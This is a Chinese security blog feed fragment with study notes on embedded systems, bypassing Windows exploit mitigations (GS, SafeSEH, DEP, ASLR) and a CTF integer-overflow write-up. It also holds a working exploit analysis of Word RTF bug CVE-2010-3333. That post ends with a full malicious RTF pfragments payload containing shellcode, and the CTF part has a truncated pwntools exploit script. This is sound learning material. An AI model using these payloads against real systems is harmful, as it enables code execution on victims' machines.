    <content type="html"><![CDATA[<h1 id="0x01-嵌入式系统入门"><a href="#0x01-嵌入式系统入门" class="headerlink" title="0x01 嵌入式系统入门"></a>0x01 嵌入式系统入门</h1><p><b>什么是嵌入式系统：</b></p><p>一种为特定设备服务的，软件硬件可裁剪的计算机系统，形式变化多样、体积小。如手机、微波炉，对于手机、微波炉来说，需要小型计算机来控制，换句话，是需要把计算机全入到手机和微波炉里，也就是嵌入式系统，不需要严格地响应时间和数据吞吐量，最关键的是能够缩小体积以及功能专门化，嵌入式系统种类繁多，按照系统硬件的核心处理器来说可以分成嵌入式微控制器和嵌入式微处理器。</p><p><b>嵌入式微控制器：</b></p><p>嵌入式微控制器也就是传统意义上的单片机，是目前嵌入式系统的前身。单片机就是把一个计算机的主要功能集成到一个芯片上，即一个芯片就是一个计算机，体积小、结构简单、便于开发以及价格经济。</p><p>通常一个单片机芯片包含运算处理单元、ARM、Flash存储器以及外部接口，通过外部接口可以输出或者输入心寒，控制相应的设备，用户可以把编写好的代码烧写到单片机芯片内部来控制外部设备。</p><p><b>嵌入式微处理器：</b></p><p>单片机处理能力低，嵌入式微处理器是最近几年随着大规模集成电路发展同步，处理能力更强，目前主流嵌入式微处理器都是32位，而单片机多是8位和16位。</p><p><b>典型嵌入式系统组成：</b></p><p>嵌入式系统与传统PC一样，也是一种及计算机系统，由硬件和软件组成，硬件包括嵌入式微控制器和微处理器，以及一些外围元器件和外部设备；软件包括嵌入式操作系统和应用软件。</p><p>嵌入式系统种类繁多，不同的嵌入式系统软、硬件很难兼容，软件必须修改而硬件必须重新设计才能使用。</p><p>典型嵌入式系统:</p><ul><li>硬件：<ul><li>嵌入式处理器：处理器是整个系统的核心，负责处理所有的软件程序以及外部设备的信号</li><li>外部设备：在不同系统中有不同选择。</li></ul></li><li>软件：<ul><li>嵌入式操作系统：是软硬件的接口，负责管理系统的所有软件和硬件资源，还可以通过驱动程序与外部设备打交道。</li><li>应用软件：利用操作系统提供的功能开发出针对某个需求的程序，供用户使用。</li></ul></li></ul><h1 id="0x02-嵌入式软硬件系统"><a href="#0x02-嵌入式软硬件系统" class="headerlink" title="0x02 嵌入式软硬件系统"></a>0x02 嵌入式软硬件系统</h1><p>数字电路是计算机的基础。</p><p>进制转换</p><p>计算机组成原理</p><p>直接内存访问：DMA</p><p>软件：系统软件、应用软件</p><p>软件开发：需求分析、概要设计和详细设计、编码和调试、测试和维护。</p><p>常见软件开发模型：瀑布开发模型、增量开发模型、统一软件开发模型。</p><p>操作系统的基本结构都是内核、驱动程序、程序库。</p><h1 id="0x03-ARM处理器"><a href="#0x03-ARM处理器" class="headerlink" title="0x03 ARM处理器"></a>0x03 ARM处理器</h1><ul><li>微处理器<ul><li>通用微处理器：用于高性能计算</li><li>嵌入式微处理器：针对某种特定应用的高能力计算</li><li>微控制器：用于控制某种设备，通常集成了多种外部设备控制器，处理指令能力不强但价格低廉。</li></ul></li></ul><p>ARM:高性能RISC机器。</p><ul><li>芯片体积小，功耗低，成本低性能优异</li><li>支持Thumb(16位)和ARM(32位)</li><li>内部大量使用寄存器，执行指令速度快。</li><li>大部分指令是操作寄存器，很少访问外部内存</li><li>采用多级流水线结构处理速度快。</li><li>多种寻址方式，数据存取方式灵活</li><li>指令长度固定，便于编译器操作以及执行指令</li></ul><h3 id="ARM指令集"><a href="#ARM指令集" class="headerlink" title="ARM指令集"></a>ARM指令集</h3><ul><li>算术运算指令<ul><li>ADD:加法运算<ul><li>add dest,op1,op2 //dest是目的寄存器，op1 op2是操作数,dest=op1+op2</li></ul></li><li>ADC:带进位加法<ul><li>ADC dest,op1,op2</li></ul></li><li>SUB:减法<ul><li>sub dest,op1,op2</li><li>dest=op1-op2</li></ul></li><li>SBC：带进位减法</li></ul></li><li>逻辑运算指令<ul><li>AND:逻辑与(1 1为1，0 0为1，1 0为0)<ul><li>and dest,op1,op2</li><li>dest=op1 and op2</li></ul></li><li>EOR:异或（1 1为0，0 0为0，10为1）</li><li>MOV:复制数据<ul><li>mov dest,op1</li><li>dest=op1</li><li>mov r0,r0,LSL#3//r0=r0*8,LSL寄存器左移三位，即乘以8</li></ul></li></ul></li><li>分支指令<ul><li>B:跳转<ul><li>b 地址 //跳转到指定地址</li></ul></li></ul></li><li>数据传送指令<ul><li>单一数据传送指令：向内存装载和存储一个字节或一个字长的数据<ul><li>LDR Rd,地址</li><li>STR Rd,地址</li><li>LDR B Rd,地址</li><li>STR B Rd,地址</li></ul></li><li>多数据传送指令：向内存装载和存储多个字节或字的数据<ul><li>xxM Rn(!),&lt;寄存器列表&gt;{^}</li><li>xx:LD–装载，ST–存储</li><li>LDMED LDMIB//++i</li><li>LDMFD LDMIA//i++</li><li>LDMEA LDMDB//++*i</li><li>LDMFA LDMDA//*i++</li><li>STMFA STMIB//存储前增加地址</li><li>STMEA STMIA//存储后增加地址</li><li>STMFD STMDB//存储前增加值</li><li>STMED STMDA//存储后增加值</li></ul></li></ul></li></ul><p>ARM状态：0位表示ARM状态，1位表示Thumb状态,BX指令切换状态。</p><p>MMU:内存管理单元。</p><blockquote><p>LSL:逻辑左移，二进制从右往左移动，空位补0（就是原数值乘以2的移位次方）<br>LSR:逻辑右移，二进制从左往右，空位补0<br>ASR:算术右移，符号位不变，高位空出补0，低位补1<br>ROR:循环右移，低位移到高位<br>RRX:带扩展的循环右移：操作数右移一位，高端空出位用原C标志值填充</p></blockquote><h3 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h3><ul><li>立即寻址:用#表示数值<ul><li>subs r0,#1;r0=r0-1</li><li>mov r0,#0xff00;r0=0xff00</li></ul></li><li>寄存器寻址方式：读取寄存器得到操作数<ul><li>mov r1,r2;r1=r2</li><li>sub r0,r1,r2;r0=r1-r2</li></ul></li><li>寄存器偏移寻址：寄存器的值移位得结果<ul><li>mov r0,r1,LSL #3;r0=r1*8</li><li>ands r0,r2,LSL #3;r0= r2*8 and r1</li></ul></li><li>寄存器间接寻址：寄存器为地址，从对应内存重取出数据<ul><li>LDR r0,[r1];r1为地址，从内存中取出数据存入r0</li><li>SWP r0,r0,[r1];r1为地址，从内存中取出数据与r0交换</li></ul></li><li>基址寻址：把寄存器内容与指定便宜相加，得数据地址，后从内存中取出数据<ul><li>LDR r0,[r1,#0xf];r1数值与0xf相加得到数据地址</li><li>STR r0,[r1,#-2];r1数值-2得到数据地址</li></ul></li><li>多寄存器寻址：一次传输多个寄存器值<ul><li>LDMIA r1!,{r2<del>r7,r12};r1单元重数据读到r2</del>r7和r12,r1指定地址自动加1</li></ul></li><li>栈寻址：先进后出，通过栈指针寄存器寻址<ul><li>STMFD SP!,{R0<del>R7,LR};r0</del>r7和LR的内容压入堆栈</li><li>LDMFD SP!,{r0<del>r7,LR};从堆栈中取出数据到r0</del>r7和LR</li></ul></li></ul><h1 id="0x04-嵌入式Linux"><a href="#0x04-嵌入式Linux" class="headerlink" title="0x04 嵌入式Linux"></a>0x04 嵌入式Linux</h1><p>一般来说，嵌入式操作系统是由启动程序、核心、根文件系统组成，通过特殊的烧录工具将编译好的嵌入式系统文件影像烧写到目标板的只读存储器（ROM）或Flash存储器中。</p><h1 id="0x05-建立软件开发环境"><a href="#0x05-建立软件开发环境" class="headerlink" title="0x05 建立软件开发环境"></a>0x05 建立软件开发环境</h1><ul><li>运行在windows平台下得到Linux系统模拟环境：Cygwin.</li><li>linux下：串口工具minicom</li><li>windows下：串口工具xshell</li><li>ARM集成开发环境ADS<ul><li>c语言编译器armcc</li><li>c++语言编译器armcpp</li></ul></li></ul><h1 id="0x06-第一个linux应用程序"><a href="#0x06-第一个linux应用程序" class="headerlink" title="0x06 第一个linux应用程序"></a>0x06 第一个linux应用程序</h1><ul><li>vi创建源代码文件hello.c</li><li>gcc -c hello.c 编译运行</li></ul><h1 id="0x07-Linux应用程序编程基础"><a href="#0x07-Linux应用程序编程基础" class="headerlink" title="0x07 Linux应用程序编程基础"></a>0x07 Linux应用程序编程基础</h1><ul><li>堆栈</li><li>内存管理函数<ul><li>malloc():分配内存，不能初始化内存空间</li><li>free()：释放malloc()分配的内存</li></ul></li><li>实用的内存分配函数<ul><li>calloc():分配一块新内存，向应用程序分诶内存，分配后会初始化新分配的内存空间</li><li>realloc():改变一块已经分配的内存大小，函数调整后的内存空间起始地址有可能与原来的不同，所以需要realloc()函数的返回值。</li></ul></li><li>文件指针和流：FILE*fp</li><li>getc() /fgetc() /getchar()</li><li>POSIX文件I/O编程<ul><li>POSIX可移植操作系统接口</li><li>open() /creat() /close() /read() /write() /fcnt()修改一打开文件属性</li><li>文件头：<ul><li>&lt;sys/types.h&gt;</li><li>&lt;sys/stat.h&gt;</li><li>&lt;fcntl.h&gt;</li></ul></li></ul></li></ul><h1 id="0x08-开发多进程-x2F-线程程序"><a href="#0x08-开发多进程-x2F-线程程序" class="headerlink" title="0x08 开发多进程/线程程序"></a>0x08 开发多进程/线程程序</h1><ul><li>PCB进程控制块</li><li>fork()调用创建进程</li><li>退出进程：exit()、_exit()、atexit()、on_exit().</li><li>常用进程间通信方法：<ul><li>管道：单方向传送数据，只能在有共同父进程的进程间使用<ul><li>pipe()函数：创建管道</li><li>#include&lt;unistd.h&gt; int pipe(int filedes[1]);</li></ul></li><li>共享内存：不同进程可访问<ul><li>int shmget():创建</li><li>void *shmat：获得一个共享内存ID对应的内存其实地址</li><li>int shmdt：从程序中分立一块共享内存</li></ul></li><li>FIFO</li><li>消息队列</li><li>信号量</li><li>共享存储</li><li>socker</li></ul></li><li>Linux的多进程和多线程</li></ul><h1 id="0x09-网络通信应用"><a href="#0x09-网络通信应用" class="headerlink" title="0x09 网络通信应用"></a>0x09 网络通信应用</h1><ul><li>TCP/IP协议簇</li></ul><p><img src="https://i.loli.net/2020/09/07/REugKvzkfIn7B58.png" alt="捕获.PNG"></p><ul><li>IP协议：在传输层，负责数据包的传输管理<ul><li>实现两个功能：寻址和分段</li></ul></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞战争学习笔记2：CVE-2010-3333</title>
    <link href="/2022/08/09/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%EF%BC%9ACVE-2010-3333/"/>
    <url>/2022/08/09/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%EF%BC%9ACVE-2010-3333/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01-分析环境"><a href="#0x01-分析环境" class="headerlink" title="0x01 分析环境"></a>0x01 分析环境</h2><p>os:由于笔者实在没有找到大佬们使用的目标文件office word 2003 11.5604.5606,只有11.8169.8172，但是应该只要是2003 sp3的应该就问题不大。</p><p>操作系统：windows XP SP3<br>虚拟机：VM<br>调试器：WinDbg、OD、IDA<br>office:office word 2003 11.8169.8172</p><h2 id="0x02-漏洞描述"><a href="#0x02-漏洞描述" class="headerlink" title="0x02 漏洞描述"></a>0x02 漏洞描述</h2><p>oddice xp sp3、2003 sp3、2007 sp2、2010等多个版本的office软件中的Open XML文件格式转换器存在栈溢出漏洞，主要是在处理RTF的”pFragments”属性时存在栈溢出，导致远程攻击者可以借助特制的RTF数据执行任意代码，因此该漏洞又名”RTF栈缓冲区溢出漏洞”。</p><p>office word 2003中的MSO.dll库在解析RTF文档的绘图pFRagments属性时完全信任其数据，未做任何检查便将数据复制到栈中，存在了栈溢出的可能，导致用户打开精心构造的RTF文件时就有可能导致执行任意代码。</p><h2 id="0x03-分析过程"><a href="#0x03-分析过程" class="headerlink" title="0x03 分析过程"></a>0x03 分析过程</h2><p>用Metasploit生成测试样本msf.rtf。</p><p><img src="https://i.loli.net/2020/07/31/GPUKdY8nFfENx5y.png" alt="生成msf.PNG"></p><p>运行WinDbg附加Word 2003，但是每次都是还没有打开测试样本的时候，windbg就已经报错了，我裂开了呀。然后看报错是ntdll.dll文件符号文件无法找到，那我下载一个弄，结果并没有缺失，我又裂开了！</p><p><img src="https://i.loli.net/2020/07/31/ilXRZynC2UDtJ9T.png" alt="裂开.PNG"></p><p>[待续]</p><p>打开测试样本，WinDbg捕获异常，循环赋值内存数据到栈空间时，未检测复制的内存大小，导致覆盖到edi（0x130000）开始的不可写页面,触发异常的指令位于30e9eb88,当前栈已被样本生成的垃圾数据覆盖。</p><ul><li>g</li><li>kb</li></ul><p>在30e9eb88处下断，重新打开测试样本，断下来后通过kb指令得到的信息进行回溯，<br>结合IDA，可知调用函数及其执行流程：30f4cc5d-&gt;30f4cc93 call 30e9eb62-&gt;30e9eb88</p><p>通过跟踪分析可发现，复制的数据大小由样本中的某一处决定，如下面两张图，前面的4在后面的计算中会变成0，并且将c8ac除以4（因为操作的大小为DWORD</p><ul><li>p</li></ul><p>为了确定该栈溢出漏洞能劫持程序运行流程，自己构造一个长度偏小（防止触发访问异常）但又能覆盖返回地址的测试样本, 打开该样本，WinDbg捕获异常，eip已被改为111111，至此我们可以确定该栈溢出漏洞可被利用</p><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><h3 id="覆盖返回地址"><a href="#覆盖返回地址" class="headerlink" title="覆盖返回地址"></a>覆盖返回地址</h3><p>找到覆盖成返回地址的地方，修改成0x7ffa4512（jmp esp），再在后面添加一些0x90，然后运行起来还没到执行到栈中就会崩溃，推测前面测试样本太小没怎么污染到栈空间，一开始还想着还原栈空间，但是重新分析了测试样本后发现其在下图中30F4CB29处是实现跳转的，而加了一些0x90后不跳转，并进行了一些与栈相关的操作，从而导致崩溃</p><h3 id="布置shellcode"><a href="#布置shellcode" class="headerlink" title="布置shellcode"></a>布置shellcode</h3><p>分析了下，是栈中多了一些0x90导致原来的一堆00不见了，所以需要在返回地址后面加40个00，这样就可以执行到栈中了。在后面加入shellcode，重新运行并成功进入shellcode，<br>布置shellcode如下：</p><p>z<br>{\rtf1{}{\shp{*\shpinst{\sp{\sn pfragments}{\sv1;1;11111111111111111111111111111111111111111111111111111245fa7f0000000000000000000000000000000000000000fc686a0a381e686389d14f683274910c8bf48d7ef433dbb7042be366bb33325368757365725433d2648b5a308b4b0c8b491c8b098b6908ad3d6a0a381e750595ff57f895608b453c8b4c057803cd8b592003dd33ff478b34bb03f5990fbe063ac47408c1ca0703d046ebf13b54241c75e48b592403dd668b3c7b8b591c03dd032cbb955fab57613d6a0a381e75a933db536875730000687267656f68524e476f8bc453505053ff57fc53ff57f8}}}}}<br>```</p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞战争</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>各类型软件漏洞合集</title>
    <link href="/2022/08/09/%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/"/>
    <url>/2022/08/09/%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-格式化串漏洞"><a href="#0x01-格式化串漏洞" class="headerlink" title="0x01 格式化串漏洞"></a>0x01 格式化串漏洞</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>格式化串漏洞产生于数据输出函数中对输出格式解析的缺陷。当输入输出函数的格式控制符能够被外界影响时，攻击者可以利用读写内存的方法修改函数返回地址，劫持进程，使shellcoed得到执行。</p><p>此类漏洞发生条件苛刻，实际案例很少。</p><h2 id="能够引起此漏洞的函数"><a href="#能够引起此漏洞的函数" class="headerlink" title="能够引起此漏洞的函数"></a>能够引起此漏洞的函数</h2><figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* format [,argument]...)</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">wprintf</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* format [,argument]...)</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">fwprintf</span><span class="hljs-params">(FILE* stream,<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* format [,argument]...)</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">sprintf</span><span class="hljs-params">(<span class="hljs-type">char</span> buffer,<span class="hljs-type">const</span> <span class="hljs-type">char</span>* format [,argument]...)</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">swprintf</span><span class="hljs-params">(<span class="hljs-type">wchar_t</span> *buffer,<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span> *format [,argument]...)</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">vprintf</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* format,va_list argptr )</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">vwprintf</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* format,va_list argptr )</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">vfprintf</span><span class="hljs-params">(FILE *stream,<span class="hljs-type">const</span> <span class="hljs-type">char</span>* format,va_list argptr )</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">vfwprintf</span><span class="hljs-params">(FILE *stream,<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* format,va_list argptr )</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">vsprintf</span><span class="hljs-params">(<span class="hljs-type">char</span> *buffer,<span class="hljs-type">const</span> <span class="hljs-type">char</span>* format,va_list argptr )</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">vswprintf</span><span class="hljs-params">(<span class="hljs-type">wchar_t</span> *buffer,<span class="hljs-type">const</span> <span class="hljs-type">wchar_t</span>* format,va_list argptr )</span></span>;<br></code></pre></td></tr></tbody></table></figure><h1 id="0x02-GS安全编译选项保护"><a href="#0x02-GS安全编译选项保护" class="headerlink" title="0x02 GS安全编译选项保护"></a>0x02 GS安全编译选项保护</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>在所有函数调用发生时，GS编译选项会向栈帧内压入一个额外的随机DWORD,这个随机数被称为canary，在EBP前，系统在.data内存区存放了canary副本，函数返回前系统会执行安全验证操作，比较栈帧中canary与内存区副本是否一致，不一致则证明发生溢出，系统将进行异常处理。</p><h2 id="以下情况不会应用GS"><a href="#以下情况不会应用GS" class="headerlink" title="以下情况不会应用GS"></a>以下情况不会应用GS</h2><ul><li>函数不包含缓冲区</li><li>函数被定义为具有变量参数列表</li><li>函数使用无保护的关键字标记</li><li>函数在第一个语句中包含内嵌汇编代码</li><li>缓冲区不是8字节类型且大小不大于4个字节。</li></ul><h2 id="典型突破GS的方法"><a href="#典型突破GS的方法" class="headerlink" title="典型突破GS的方法"></a>典型突破GS的方法</h2><h3 id="利用未保护的内存"><a href="#利用未保护的内存" class="headerlink" title="利用未保护的内存"></a>利用未保护的内存</h3><p>为了将GS对性能的影响降到最小，并不会所有的函数都会被保护，我们可以利用一些未被保护的函数绕过GS保护。</p><blockquote><p>例子：函数中不包含4字节以上的缓冲区，不受到GS保护，函数返回前未进行任何安全检测，可以覆盖返回地址。</p></blockquote><pre><code class="mov">    mov esp,ebp    pop ebp    retn```### 覆盖虚函数程序只有在函数返回时才会check，而在此之前没有任何检查措施，我们可以在程序检查cookie之前劫持程序流程，实现溢出。&gt; 例子：利用C++的虚函数来绕过GS机制。&gt;&gt; 当函数中存在溢出，可能会影响到虚表指针，继而可以控制虚表指针使其指向我们可以控制的内存空间。&gt; 虚函数实现过程：程序根据虚表指针找到虚表，然后从虚表中取出要调用的虚函数地址，根据地址转入虚函数执行。### 攻击异常处理GS对S.E.H没有提供保护。我们可以通过攻击异常处理绕过GS.通过超长字符串覆盖掉异常处理函数指针，想办法触发一个异常，程序就会转入异常处理，由于异常处理函数指针已经被覆盖，我们就可以通过劫持S.E.H来控制程序的后续流程。### 同时替换栈中和.data中的Cookiecookie的生成具有很强的随机性，因为才出来基本不可能。同时替换栈中和.data中的cookie保证溢出后的一致性。&gt; 例子：将shellcode赋值为8个0x90,OD运行断在test函数的if语句处，从if_addr取出cookie，与ebp异或后放入ebp-4的位置去。（函数返回前的校验过程：程序从ebp-4的位置取出cookie,与ebp异或后与if_addr处cookie比较一致性），如此.data中cookie成功修改为0x90.&gt; 接下来控制栈中cookie，通过超长字符串覆盖变量，修改cookie。&gt; 布置shellcode:首先放4个0x90用于修改if_addr，然后跟着弹出“failwest”的机器码，然后用0x90填充至cookie的位置，接下来跟着90909090与当前ebp异或的结果，最后再加上4个字节的填充和shellcode起始地址(用来覆盖函数返回地址)# 0x03 SafeSEH：对异常处理的保护机制在程序调用异常处理函数前，对要调用的异常处理函数进行校验，当发现函数不可靠将终止异常处理函数的调用。## 校验流程异常处理函数的调用是通过RtlDispatchException()函数处理实现，SafeSEH机制也是从此处开始。其校验流程如下：* 检查异常处理链是否位于当前程序的栈中* 异常处理指针是否指向当前程序栈中* 调用函数RtlIsVaildHandler()对异常处理函数进行校验    * 异常处理函数地址是否在加载模块的内存空间    * 判断程序是否设置了IMAGE_DLLCHARACTERISTICS_NO_SEH标识（标识被设置，函数返回校验失败）    * 程序中是否包含安全S.E.H表，将异常处理函数地址与该表匹配，成功则继续    * 判断是否设置ILonly标识。（设置此标识，证明该程序只包含.NET编译人中间语言，校验失败）    * 判断异常处理函数地址是否位于不可执行页上，位于，则检测DEP是否开启，未开启则校验成功    * 判断系统是否允许跳转到加载模块的内存空间外执行，允许则返回成功&gt; RtlIsVaildHandler()允许异常处理函数执行的情况：&gt;&gt; 异常处理函数位于加载模块内存范围之外，DEP关闭&gt;&gt; 异常处理函数位于加载模块内存范围之内，相应模块未启用SafeSEH，且模块不是纯IL（中间语言）.&gt;&gt; 异常处理函数位于加载模块内存范围之内，相应模块未启用SafeSEH，异常处理函数地址包含在安全SEH表中。## 绕过SafeSEH（不考虑DEP影响）* 攻击返回地址绕过。    * 一个程序启用了SafeSEH但是未启用GS(或被攻击函数不受到GS保护)，攻击函数返回地址* 利用虚函数绕过* 从堆中绕过* 利用未启用SafeSEH模块绕过* 利用加载模块之外的地址绕过SafeSEH* # 0x04 DEP## 介绍溢出攻击的根源在于现代计算机对数据和代码没有明确区分这一先天缺陷，DEP(数据执行保护)就是用来弥补计算机对数据和代码混淆这一天然缺陷。DEP基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。DEP主要作用是阻止数据页执行代码，分为软件DEP和硬件DEP.软件DEP即SafeSEH，与CPU硬件无关。硬件DEP是由Windows利用软件模拟实现，对操作系统提供一定的保护。（硬件DEP才是真正的DEP,需要CPU支持，AMD称之为NX，Intel称之为XD）## 攻击DEP方法### 攻击未启用DEP程序### 利用Ret2Libc挑战DEPret2libc是return-to-libc的缩写，由于DEP不允许我们直接到非可执行也执行指令，我们需要在其他可执行的位置找到符合我们要求的指令，让这条指令替我们工作，为了控制此条指令，在指令执行后还需要一个返回指令，以便回收程序的控制权。#### 三种相对有效的绕过DEP的exploit方法* 通过跳转到ZwSetInformationProcess函数将DEP关闭后再转入shellcode执行* 通过跳转到VirtualProtect函数来将shellcode所在内存页设置为可执行状态，然后在转入shellcode执行* 通过跳转到VIrtualAlloc函数开辟一段具有执行权限的内存空间建，然后将shellcode复制到这段内存中执行### 利用可执行内存挑战DEP有时候在进程的内存空间中会存在一段可读可写可执行的内存，如果能够将shellcode复制到这段内存中，并劫持程序流程，我们的shellcode就有执行的机会。此处需要一些运气，然而我在做实验上一向运气很差……,如果被攻击的程序内存空间中存在这样一个可执行的数据区域，就可以直接通过memcpy函数将shellcode复制到这段内存区域中执行。### 利用.NET挑战DEP.NET的文件具有和PE文件一样的结构，即也具有.text等段，这些段会被映射到内存中，也会具有一定的可执行属性。将shellcode放到.NET中具有可执行属性的段中，然后让程序转入这个区域执行，就可以执行shellcode了。### 利用java applet挑战DEPjava applet与.NET类似，都可以被IE浏览器加载到客户端，而且加载到IE进程的内存空间后这些控件所在内存空间都具有可执行属性。# 0x05 ASLR## 介绍ASLR,通过加载程序的时候不再使用固定的基址加载，从而干扰shellcode定位的一种保护机制。包含了映像随机化、堆栈随机化、PEB与TEB随机化。（支持ASLR的程序在它的PE头中会设置IMAGE_DLL_CHARACTERISITCS_DYNAMIC_BASE标识来说明，编译程序时启用/dynmicbase链接选项就可以支持ASLR了）### 映像随机化在PE文件映射到内存中，对其加载的虚拟地址进行随机化处理，这个地址是在系统启动时确定的，系统重启红藕这个地址会变化。映像随机化只对加载基址的前2个字节做了随机处理。### 堆栈随机化在程序运行时随机的选择堆栈基址，堆栈基址在打开程序的时候确定。### PEB和TEB随机化TEB存放在FS:0和FS:[0x18]处，PEB存放在TEB偏移0x30的位置。## 攻击方式### 攻击未启用ASLR模块ASLR仅仅是安全机制，不支持ASLR的软件很多，这意味着加载基址固定，在当前进程找到这样的模块就可以利用它里面的指令作为跳板直接无视ASLR.如：Adobe Flash Player ActiveX### 利用部分覆盖进行定位内存地址之前说过，映像随机化只是对映像加载基址的前2个字节做随机化处理，我们可覆盖这个地址的最后几个固定字节，就可以在一定范围内控制程序。采用这种类似相对寻址方法来动态确定跳板指令的地址以实现调班指令的通用性。### 利用Heap spray技术定位内存地址Heap spray原理：通过申请大量的内存，占领内存中的0x0C0C0C0C的位置，并在这些内存中放置0x90和shellcode，最后控制程序转入0x0C0C0C0C执行。### 利用Java applet heap spray技术定位内存地址### 为.NET控件禁用ASLR</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界 int_overflow</title>
    <link href="/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-int_overflow/"/>
    <url>/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-int_overflow/</url>
    
    <content type="html"><![CDATA[<h3 id="checksec-查看保护机制"><a href="#checksec-查看保护机制" class="headerlink" title="checksec 查看保护机制"></a>checksec 查看保护机制</h3><p><img src="https://i.loli.net/2020/05/08/65ugNXJH9UezRwD.png" alt="捕获.PNG"></p><p>可直接使用栈溢出；基地址不变化；栈中数据有执行权限；</p><h3 id="分析思路"><a href="#分析思路" class="headerlink" title="分析思路"></a>分析思路</h3><p>32位文件，按流程查看程序，main()无突破点。</p><p>进入login(),限制username长度最大0x19;限制passwd长度最大0x199；</p><p>进入check_passwd()，v3存储passwd长度，满足if语句3&lt;v3&lt;=8可跳到else语句。</p><blockquote><p>此处有突破点：v3类型为unsigned __int8,，取值范围0~255，而v3存储的passwd最大为0x199,即409.远大于v3取值范围。此处为典型整数溢出。</p></blockquote><p>综上:if语句中的v3范围为（3,8]或[259,264] （最大为255，若使其溢出，则需再加四字节，__int8 是指8bit）</p><p>溢出之后到达else语句，函数返回  strcpy(dest,s)，dest为字符串拷贝目的栈，长度为0x14。</p><p><img src="https://i.loli.net/2020/05/08/7oCFMwki9HutVlr.png" alt="17627983-0f96bbadb310adc5.png"></p><p>在字符串中发现cat flag,属于函数 what_is_this()，地址为0x0804868B.</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>可以利用栈溢出，令passwd直接覆盖dest,直接使函数返回what_is_this()。</p><p>在字符拷贝过程中，输入0x14个字符，可覆盖函数返回地址，具体是否为0x14个字符，现在查看汇编语言：</p><p><img src="https://i.loli.net/2020/05/08/fwHUd4pY5bWSnEN.png" alt="17627983-255df211907024ca.png"></p><p><img src="https://i.loli.net/2020/05/08/a9sNLkX6R5ve8G4.png" alt="17627983-73596713043662d6.png"></p><p>在字符串拷贝前，先将拷贝原地址和目的地址压入堆栈，在函数最开始压入ebp变量，在函数结尾存在leave指令，在32位程序中，leave指令等于mov esp,ebp和pop ebp。即：<strong>在覆盖函数返回地址前，还有一次出栈操作，数值4字节。即覆盖之前还需将这4字节覆盖。</strong>随机选取数值262.<br>（what_is_this()函数的地址为4字节）</p><p>262-0x14-4-4=234</p><p>或者，我在gdb中调试程序，在strcpy下断点，passwd填上‘a’*262，观察到ebp值为4字节。</p><p><img src="https://i.loli.net/2020/05/08/c84MRnrbJZA1zFH.png" alt="捕获.PNG"></p><p>exp:</p><figure class="highlight vim"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vim">from pwn import*<br><span class="hljs-keyword">sh</span>=remote(<span class="hljs-string">'111.198.29.45'</span>,<span class="hljs-number">39118</span>)<br><span class="hljs-keyword">sh</span>.recvuntil(<span class="hljs-string">'Your choice:'</span>)<br>flag=<span class="hljs-number">0</span>x0804868B<br><span class="hljs-keyword">sh</span>.sendline(<span class="hljs-string">'1'</span>)<br><span 